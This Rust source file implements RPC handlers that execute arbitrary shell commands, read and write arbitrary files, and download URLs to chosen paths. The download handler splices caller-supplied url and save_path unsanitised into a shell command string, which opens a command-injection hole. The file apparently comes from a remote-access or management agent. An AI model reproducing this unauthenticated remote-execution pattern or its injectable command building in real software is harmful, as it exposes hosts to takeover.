use crate::{file, shell};
use std::env::current_exe;
use log::info;

pub fn handle_shell_call(
    method: &str,
    params: &Option<serde_json::Value>,
) -> (Option<String>, serde_json::Value) {
    match method {
        "exec" => {
            if let Some(serde_json::Value::Array(arr)) = params {
                if let Some(serde_json::Value::String(cmd)) = arr.get(0) {
                    match shell::exec_cmd(cmd) {
                        Ok(output) => (None, serde_json::json!(output)),
                        Err(e) => (
                            Some(format!("{:?}", e).to_string()),
                            serde_json::Value::Null,
                        ),
                    }
                } else {
                    (
                        Some("First param must be string".to_string()),
                        serde_json::Value::Null,
                    )
                }
            } else {
                (
                    Some("Params must be an array".to_string()),
                    serde_json::Value::Null,
                )
            }
        }
        _ => (Some("Unknown method".to_string()), serde_json::Value::Null),
    }
}
pub fn handle_file_call(
    method: &str,
    params: &Option<serde_json::Value>,
) -> (Option<String>, serde_json::Value) {
    match method {
        "read" => {
            if let Some(serde_json::Value::Array(arr)) = params {
                if let Some(serde_json::Value::String(file_path)) = arr.get(0) {
                    match file::get_file_content(file_path) {
                        Ok(output) => (None, serde_json::json!(output)),
                        Err(e) => (
                            Some(format!("{:?}", e).to_string()),
                            serde_json::Value::Null,
                        ),
                    }
                } else {
                    (
                        Some("First param must be string".to_string()),
                        serde_json::Value::Null,
                    )
                }
            } else {
                (
                    Some("Params must be an array".to_string()),
                    serde_json::Value::Null,
                )
            }
        }
        "write" => {
            if let Some(serde_json::Value::Array(arr)) = params {
                if let Some(serde_json::Value::String(file_path)) = arr.get(0) {
                    if let Some(serde_json::Value::String(content)) = arr.get(1) {
                        match file::put_file_content(file_path, content) {
                            Ok(output) => (None, serde_json::json!(output)),
                            Err(e) => (
                                Some(format!("{:?}", e).to_string()),
                                serde_json::Value::Null,
                            ),
                        }
                    } else {
                        (
                            Some("second param must be string".to_string()),
                            serde_json::Value::Null,
                        )
                    }
                } else {
                    (
                        Some("First param must be string".to_string()),
                        serde_json::Value::Null,
                    )
                }
            } else {
                (
                    Some("Params must be an array".to_string()),
                    serde_json::Value::Null,
                )
            }
        }
        "download" => {
            if let Some(serde_json::Value::Array(arr)) = params {
                if let Some(serde_json::Value::String(url)) = arr.get(0) {
                    if let Some(serde_json::Value::String(save_path)) = arr.get(1) {
                        let cmd = &format!("{} --download-url {} --save-path {}",current_exe().unwrap().display(),url, save_path);
                        info!("[+] exec_cmd: {}",cmd);
                        match shell::exec_cmd(cmd) {
                            Ok(output) => (None, serde_json::json!(output)),
                            Err(e) => (
                                Some(format!("{:?}", e).to_string()),
                                serde_json::Value::Null,
                            ),
                        }
                    } else {
                        (
                            Some("second param must be string".to_string()),
                            serde_json::Value::Null,
                        )
                    }
                } else {
                    (
                        Some("First param must be string".to_string()),
                        serde_json::Value::Null,
                    )
                }
            } else {
                (
                    Some("Params must be an array".to_string()),
                    serde_json::Value::Null,
                )
            }
        }
        _ => (Some("Unknown method".to_string()), serde_json::Value::Null),
    }
}
